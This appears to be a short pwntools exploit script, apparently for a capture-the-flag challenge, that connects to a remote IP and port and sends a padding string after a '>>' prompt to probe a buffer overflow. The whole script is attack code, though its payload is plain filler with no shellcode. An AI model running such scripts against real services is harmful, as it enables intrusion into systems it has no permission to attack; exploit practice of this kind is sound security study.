from pwn import *

context.arch = 'amd64'
context.log_level = 'debug'

ip, port = '159.65.86.238', 32264
io = remote(ip, port)

payload = 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBCCCC'
io.recvuntil('>>')
io.sendline(payload)
io.recvall()
